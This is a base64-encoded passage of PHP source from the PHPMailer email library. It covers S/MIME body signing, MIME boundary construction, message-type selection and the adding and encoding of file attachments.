2R5LCAkdGhpcy0+RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQoKICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgewogICAgICAgICAgICAkYm9keSA9ICcnOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2VtcHR5X21lc3NhZ2UnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2VpZiAoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICghZGVmaW5lZCgnUEtDUzdfVEVYVCcpKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKSAuICdvcGVuc3NsJyk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGZpbGUgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgJ3NyY3NpZ24nKTsKICAgICAgICAgICAgICAgICRzaWduZWQgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgJ21haWxzaWduJyk7CiAgICAgICAgICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJGJvZHkpOwoKICAgICAgICAgICAgICAgIC8vV29ya2Fyb3VuZCBmb3IgUEhQIGJ1ZyBodHRwczovL2J1Z3MucGhwLm5ldC9idWcucGhwP2lkPTY5MTk3CiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPnNpZ25fZXh0cmFjZXJ0c19maWxlKSkgewogICAgICAgICAgICAgICAgICAgICRzaWduID0gQG9wZW5zc2xfcGtjczdfc2lnbigKICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGUsCiAgICAgICAgICAgICAgICAgICAgICAgICRzaWduZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICdmaWxlOi8vJyAuIHJlYWxwYXRoKCR0aGlzLT5zaWduX2NlcnRfZmlsZSksCiAgICAgICAgICAgICAgICAgICAgICAgIFsnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9rZXlfZmlsZSksICR0aGlzLT5zaWduX2tleV9wYXNzXSwKICAgICAgICAgICAgICAgICAgICAgICAgW10KICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkc2lnbiA9IEBvcGVuc3NsX3BrY3M3X3NpZ24oCiAgICAgICAgICAgICAgICAgICAgICAgICRmaWxlLAogICAgICAgICAgICAgICAgICAgICAgICAkc2lnbmVkLAogICAgICAgICAgICAgICAgICAgICAgICAnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9jZXJ0X2ZpbGUpLAogICAgICAgICAgICAgICAgICAgICAgICBbJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpLCAkdGhpcy0+c2lnbl9rZXlfcGFzc10sCiAgICAgICAgICAgICAgICAgICAgICAgIFtdLAogICAgICAgICAgICAgICAgICAgICAgICBQS0NTN19ERVRBQ0hFRCwKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNpZ25fZXh0cmFjZXJ0c19maWxlCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBAdW5saW5rKCRmaWxlKTsKICAgICAgICAgICAgICAgIGlmICgkc2lnbikgewogICAgICAgICAgICAgICAgICAgICRib2R5ID0gZmlsZV9nZXRfY29udGVudHMoJHNpZ25lZCk7CiAgICAgICAgICAgICAgICAgICAgQHVubGluaygkc2lnbmVkKTsKICAgICAgICAgICAgICAgICAgICAvL1RoZSBtZXNzYWdlIHJldHVybmVkIGJ5IG9wZW5zc2wgY29udGFpbnMgYm90aCBoZWFkZXJzIGFuZCBib2R5LCBzbyBuZWVkIHRvIHNwbGl0IHRoZW0gdXAKICAgICAgICAgICAgICAgICAgICAkcGFydHMgPSBleHBsb2RlKCJcblxuIiwgJGJvZHksIDIpOwogICAgICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyIC49ICRwYXJ0c1swXSAuIHN0YXRpYzo6JExFIC4gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgPSAkcGFydHNbMV07CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJHNpZ25lZCk7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc2lnbmluZycpIC4gb3BlbnNzbF9lcnJvcl9zdHJpbmcoKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICAgICAkYm9keSA9ICcnOwogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRib2R5OwogICAgfQoKICAgIC8qKgogICAgICogR2V0IHRoZSBib3VuZGFyaWVzIHRoYXQgdGhpcyBtZXNzYWdlIHdpbGwgdXNlCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRCb3VuZGFyaWVzKCkKICAgIHsKICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPmJvdW5kYXJ5KSkgewogICAgICAgICAgICAkdGhpcy0+c2V0Qm91bmRhcmllcygpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHRoaXMtPmJvdW5kYXJ5OwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBzdGFydCBvZiBhIG1lc3NhZ2UgYm91bmRhcnkuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkYm91bmRhcnkKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNoYXJTZXQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNvbnRlbnRUeXBlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZwogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZXRCb3VuZGFyeSgkYm91bmRhcnksICRjaGFyU2V0LCAkY29udGVudFR5cGUsICRlbmNvZGluZykKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJyc7CiAgICAgICAgaWYgKCcnID09PSAkY2hhclNldCkgewogICAgICAgICAgICAkY2hhclNldCA9ICR0aGlzLT5DaGFyU2V0OwogICAgICAgIH0KICAgICAgICBpZiAoJycgPT09ICRjb250ZW50VHlwZSkgewogICAgICAgICAgICAkY29udGVudFR5cGUgPSAkdGhpcy0+Q29udGVudFR5cGU7CiAgICAgICAgfQogICAgICAgIGlmICgnJyA9PT0gJGVuY29kaW5nKSB7CiAgICAgICAgICAgICRlbmNvZGluZyA9ICR0aGlzLT5FbmNvZGluZzsKICAgICAgICB9CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICRib3VuZGFyeSk7CiAgICAgICAgJHJlc3VsdCAuPSBzcHJpbnRmKCdDb250ZW50LVR5cGU6ICVzOyBjaGFyc2V0PSVzJywgJGNvbnRlbnRUeXBlLCAkY2hhclNldCk7CiAgICAgICAgJHJlc3VsdCAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAvL1JGQzEzNDEgcGFydCA1IHNheXMgN2JpdCBpcyBhc3N1bWVkIGlmIG5vdCBzcGVjaWZpZWQKICAgICAgICBpZiAoc3RhdGljOjpFTkNPRElOR183QklUICE9PSAkZW5jb2RpbmcpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICRlbmNvZGluZyk7CiAgICAgICAgfQogICAgICAgICRyZXN1bHQgLj0gc3RhdGljOjokTEU7CgogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBlbmQgb2YgYSBtZXNzYWdlIGJvdW5kYXJ5LgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvdW5kYXJ5CiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVuZEJvdW5kYXJ5KCRib3VuZGFyeSkKICAgIHsKICAgICAgICByZXR1cm4gc3RhdGljOjokTEUgLiAnLS0nIC4gJGJvdW5kYXJ5IC4gJy0tJyAuIHN0YXRpYzo6JExFOwogICAgfQoKICAgIC8qKgogICAgICogU2V0IHRoZSBtZXNzYWdlIHR5cGUuCiAgICAgKiBQSFBNYWlsZXIgb25seSBzdXBwb3J0cyBzb21lIHByZXNldCBtZXNzYWdlIHR5cGVzLCBub3QgYXJiaXRyYXJ5IE1JTUUgc3RydWN0dXJlcy4KICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNldE1lc3NhZ2VUeXBlKCkKICAgIHsKICAgICAgICAkdHlwZSA9IFtdOwogICAgICAgIGlmICgkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgewogICAgICAgICAgICAkdHlwZVtdID0gJ2FsdCc7CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+aW5saW5lSW1hZ2VFeGlzdHMoKSkgewogICAgICAgICAgICAkdHlwZVtdID0gJ2lubGluZSc7CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+YXR0YWNobWVudEV4aXN0cygpKSB7CiAgICAgICAgICAgICR0eXBlW10gPSAnYXR0YWNoJzsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPm1lc3NhZ2VfdHlwZSA9IGltcGxvZGUoJ18nLCAkdHlwZSk7CiAgICAgICAgaWYgKCcnID09PSAkdGhpcy0+bWVzc2FnZV90eXBlKSB7CiAgICAgICAgICAgIC8vVGhlICdwbGFpbicgbWVzc2FnZV90eXBlIHJlZmVycyB0byB0aGUgbWVzc2FnZSBoYXZpbmcgYSBzaW5nbGUgYm9keSBlbGVtZW50LCBub3QgdGhhdCBpdCBpcyBwbGFpbi10ZXh0CiAgICAgICAgICAgICR0aGlzLT5tZXNzYWdlX3R5cGUgPSAncGxhaW4nOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIEZvcm1hdCBhIGhlYWRlciBsaW5lLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgICAgICRuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nfGludCAkdmFsdWUKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaGVhZGVyTGluZSgkbmFtZSwgJHZhbHVlKQogICAgewogICAgICAgIHJldHVybiAkbmFtZSAuICc6ICcgLiAkdmFsdWUgLiBzdGF0aWM6OiRMRTsKICAgIH0KCiAgICAvKioKICAgICAqIFJldHVybiBhIGZvcm1hdHRlZCBtYWlsIGxpbmUuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkdmFsdWUKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gdGV4dExpbmUoJHZhbHVlKQogICAgewogICAgICAgIHJldHVybiAkdmFsdWUgLiBzdGF0aWM6OiRMRTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhbiBhdHRhY2htZW50IGZyb20gYSBwYXRoIG9uIHRoZSBmaWxlc3lzdGVtLgogICAgICogTmV2ZXIgdXNlIGEgdXNlci1zdXBwbGllZCBwYXRoIHRvIGEgZmlsZSEKICAgICAqIFJldHVybnMgZmFsc2UgaWYgdGhlIGZpbGUgY291bGQgbm90IGJlIGZvdW5kIG9yIHJlYWQuCiAgICAgKiBFeHBsaWNpdGx5ICpkb2VzIG5vdCogc3VwcG9ydCBwYXNzaW5nIFVSTHM7IFBIUE1haWxlciBpcyBub3QgYW4gSFRUUCBjbGllbnQuCiAgICAgKiBJZiB5b3UgbmVlZCB0byBkbyB0aGF0LCBmZXRjaCB0aGUgcmVzb3VyY2UgeW91cnNlbGYgYW5kIHBhc3MgaXQgaW4gdmlhIGEgbG9jYWwgZmlsZSBvciBzdHJpbmcuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aCAgICAgICAgUGF0aCB0byB0aGUgYXR0YWNobWVudAogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSAgICAgICAgT3ZlcnJpZGVzIHRoZSBhdHRhY2htZW50IG5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nICAgIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlICAgICAgICBNSU1FIHR5cGUsIGUuZy4gYGltYWdlL2pwZWdgOyBkZXRlcm1pbmVkIGF1dG9tYXRpY2FsbHkgZnJvbSAkcGF0aCBpZiBub3Qgc3BlY2lmaWVkCiAgICAgKiBAcGFyYW0gc3RyaW5nICRkaXNwb3NpdGlvbiBEaXNwb3NpdGlvbiB0byB1c2UKICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQXR0YWNobWVudCgKICAgICAgICAkcGF0aCwKICAgICAgICAkbmFtZSA9ICcnLAogICAgICAgICRlbmNvZGluZyA9IHNlbGY6OkVOQ09ESU5HX0JBU0U2NCwKICAgICAgICAkdHlwZSA9ICcnLAogICAgICAgICRkaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50JwogICAgKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKCFzdGF0aWM6OmZpbGVJc0FjY2Vzc2libGUoJHBhdGgpKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdmaWxlX2FjY2VzcycpIC4gJHBhdGgsIHNlbGY6OlNUT1BfQ09OVElOVUUpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAvL0lmIGEgTUlNRSB0eXBlIGlzIG5vdCBzcGVjaWZpZWQsIHRyeSB0byB3b3JrIGl0IG91dCBmcm9tIHRoZSBmaWxlIG5hbWUKICAgICAgICAgICAgaWYgKCcnID09PSAkdHlwZSkgewogICAgICAgICAgICAgICAgJHR5cGUgPSBzdGF0aWM6OmZpbGVuYW1lVG9UeXBlKCRwYXRoKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJGZpbGVuYW1lID0gKHN0cmluZykgc3RhdGljOjptYl9wYXRoaW5mbygkcGF0aCwgUEFUSElORk9fQkFTRU5BTUUpOwogICAgICAgICAgICBpZiAoJycgPT09ICRuYW1lKSB7CiAgICAgICAgICAgICAgICAkbmFtZSA9ICRmaWxlbmFtZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoISR0aGlzLT52YWxpZGF0ZUVuY29kaW5nKCRlbmNvZGluZykpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2VuY29kaW5nJykgLiAkZW5jb2RpbmcpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gWwogICAgICAgICAgICAgICAgMCA9PiAkcGF0aCwKICAgICAgICAgICAgICAgIDEgPT4gJGZpbGVuYW1lLAogICAgICAgICAgICAgICAgMiA9PiAkbmFtZSwKICAgICAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLAogICAgICAgICAgICAgICAgNCA9PiAkdHlwZSwKICAgICAgICAgICAgICAgIDUgPT4gZmFsc2UsIC8vaXNTdHJpbmdBdHRhY2htZW50CiAgICAgICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgICAgIDcgPT4gJG5hbWUsCiAgICAgICAgICAgIF07CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvKioKICAgICAqIFJldHVybiB0aGUgYXJyYXkgb2YgYXR0YWNobWVudHMuCiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0QXR0YWNobWVudHMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YXR0YWNobWVudDsKICAgIH0KCiAgICAvKioKICAgICAqIEF0dGFjaCBhbGwgZmlsZSwgc3RyaW5nLCBhbmQgYmluYXJ5IGF0dGFjaG1lbnRzIHRvIHRoZSBtZXNzYWdlLgogICAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRkaXNwb3NpdGlvbl90eXBlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib3VuZGFyeQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGF0dGFjaEFsbCgkZGlzcG9zaXRpb25fdHlwZSwgJGJvdW5kYXJ5KQogICAgewogICAgICAgIC8vUmV0dXJuIHRleHQgb2YgYm9keQogICAgICAgICRtaW1lID0gW107CiAgICAgICAgJGNpZFVuaXEgPSBbXTsKICAgICAgICAkaW5jbCA9IFtdOwoKICAgICAgICAvL0FkZCBhbGwgYXR0YWNobWVudHMKICAgICAgICBmb3JlYWNoICgkdGhpcy0+YXR0YWNobWVudCBhcyAkYXR0YWNobWVudCkgewogICAgICAgICAgICAvL0NoZWNrIGlmIGl0IGlzIGEgdmFsaWQgZGlzcG9zaXRpb25fZmlsdGVyCiAgICAgICAgICAgIGlmICgkYXR0YWNobWVudFs2XSA9PT0gJGRpc3Bvc2l0aW9uX3R5cGUpIHsKICAgICAgICAgICAgICAgIC8vQ2hlY2sgZm9yIHN0cmluZyBhdHRhY2htZW50CiAgICAgICAgICAgICAgICAkc3RyaW5nID0gJyc7CiAgICAgICAgICAgICAgICAkcGF0aCA9ICcnOwogICAgICAgICAgICAgICAgJGJTdHJpbmcgPSAkYXR0YWNobWVudFs1XTsKICAgICAgICAgICAgICAgIGlmICgkYlN0cmluZykgewogICAgICAgICAgICAgICAgICAgICRzdHJpbmcgPSAkYXR0YWNobWVudFswXTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJHBhdGggPSAkYXR0YWNobWVudFswXTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkaW5jbGhhc2ggPSBoYXNoKCdzaGEyNTYnLCBzZXJpYWxpemUoJGF0dGFjaG1lbnQpKTsKICAgICAgICAgICAgICAgIGlmIChpbl9hcnJheSgkaW5jbGhhc2gsICRpbmNsLCB0cnVlKSkgewogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGluY2xbXSA9ICRpbmNsaGFzaDsKICAgICAgICAgICAgICAgICRuYW1lID0gJGF0dGFjaG1lbnRbMl07CiAgICAgICAgICAgICAgICAkZW5jb2RpbmcgPSAkYXR0YWNobWVudFszXTsKICAgICAgICAgICAgICAgICR0eXBlID0gJGF0dGFjaG1lbnRbNF07CiAgICAgICAgICAgICAgICAkZGlzcG9zaXRpb24gPSAkYXR0YWNobWVudFs2XTsKICAgICAgICAgICAgICAgICRjaWQgPSAkYXR0YWNobWVudFs3XTsKICAgICAgICAgICAgICAgIGlmICgnaW5saW5lJyA9PT0gJGRpc3Bvc2l0aW9uICYmIGFycmF5X2tleV9leGlzdHMoJGNpZCwgJGNpZFVuaXEpKSB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkY2lkVW5pcVskY2lkXSA9IHRydWU7CgogICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJy0tJXMlcycsICRib3VuZGFyeSwgc3RhdGljOjokTEUpOwogICAgICAgICAgICAgICAgLy9Pbmx5IGluY2x1ZGUgYSBmaWxlbmFtZSBwcm9wZXJ0eSBpZiB3ZSBoYXZlIG9uZQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbmFtZSkpIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZigKICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZTogJXM7IG5hbWU9JXMlcycsCiAgICAgICAgICAgICAgICAgICAgICAgICR0eXBlLAogICAgICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OnF1b3RlZFN0cmluZygkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJG5hbWUpKSksCiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXRpYzo6JExFCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGU6ICVzJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAkdHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgc3RhdGljOjokTEUKICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy9SRkMxMzQxIHBhcnQgNSBzYXlzIDdiaXQgaXMgYXNzdW1lZCBpZiBub3Qgc3BlY2lmaWVkCiAgICAgICAgICAgICAgICBpZiAoc3RhdGljOjpFTkNPRElOR183QklUICE9PSAkZW5jb2RpbmcpIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogJXMlcycsICRlbmNvZGluZywgc3RhdGljOjokTEUpOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIC8vT25seSBzZXQgQ29udGVudC1JRHMgb24gaW5saW5lIGF0dGFjaG1lbnRzCiAgICAgICAgICAgICAgICBpZiAoKHN0cmluZykgJGNpZCAhPT0gJycgJiYgJGRpc3Bvc2l0aW9uID09PSAnaW5saW5lJykgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAnQ29udGVudC1JRDogPCcgLiAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJGNpZCkpIC4gJz4nIC4gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgLy9BbGxvdyBmb3IgYnlwYXNzaW5nIHRoZSBDb250ZW50LURpc3Bvc2l0aW9uIGhlYWRlcgogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkZGlzcG9zaXRpb24pKSB7CiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWRfbmFtZSA9ICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkbmFtZSkpOwogICAgICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGVuY29kZWRfbmFtZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1EaXNwb3NpdGlvbjogJXM7IGZpbGVuYW1lPSVzJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdGljOjpxdW90ZWRTdHJpbmcoJGVuY29kZWRfbmFtZSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OiRMRSAuIHN0YXRpYzo6JExFCiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1EaXNwb3NpdGlvbjogJXMlcycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OiRMRSAuIHN0YXRpYzo6JExFCiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgLy9FbmNvZGUgYXMgc3RyaW5nIGF0dGFjaG1lbnQKICAgICAgICAgICAgICAgIGlmICgkYlN0cmluZykgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCRzdHJpbmcsICRlbmNvZGluZyk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+ZW5jb2RlRmlsZSgkcGF0aCwgJGVuY29kaW5nKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+aXNFcnJvcigpKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICcnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJG1pbWVbXSA9IHN0YXRpYzo6JExFOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAkbWltZVtdID0gc3ByaW50ZignLS0lcy0tJXMnLCAkYm91bmRhcnksIHN0YXRpYzo6JExFKTsKCiAgICAgICAgcmV0dXJuIGltcGxvZGUoJycsICRtaW1lKTsKICAgIH0KCiAgICAvKioKICAgICAqIEVuY29kZSBhIGZpbGUgYXR0YWNobWVudCBpbiByZXF1ZXN0ZWQgZm9ybWF0LgogICAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoICAgICBUaGUgZnVsbCBwYXRoIHRvIHRoZSBmaWxlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBUaGUgZW5jb2RpbmcgdG8gdXNlOyBvbmUgb2YgJ2Jhc2U2NCcsICc3Yml0JywgJzhiaXQnLCAnYmluYXJ5JywgJ3F1b3RlZC1wcmludGFibGUnCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVuY29kZUZpbGUoJHBhdGgsICRlbmNvZGluZyA9IHNlbGY6OkVOQ09ESU5HX0JBU0U2NCkKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoIXN0YXRpYzo6ZmlsZUlzQWNjZXNzaWJsZSgkcGF0aCkpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2ZpbGVfb3BlbicpIC4gJHBhdGgsIHNlbGY6OlNUT1BfQ09OVElOVUUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRmaWxlX2J1ZmZlciA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRwYXRoKTsKICAgICAgICAgICAgaWYgKGZhbHNlID09PSAkZmlsZV9idWZmZXIpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2ZpbGVfb3BlbicpIC4gJHBhdGgsIHNlbGY6OlNUT1BfQ09OVElOVUUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRmaWxlX2J1ZmZlciA9ICR0aGlzLT5lbmNvZGVTdHJpbmcoJGZpbGVfYnVmZmVyLCAkZW5jb2RpbmcpOwoKICAgICAgICAgICAgcmV0dXJuICRmaWxlX2J1ZmZlcjsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgI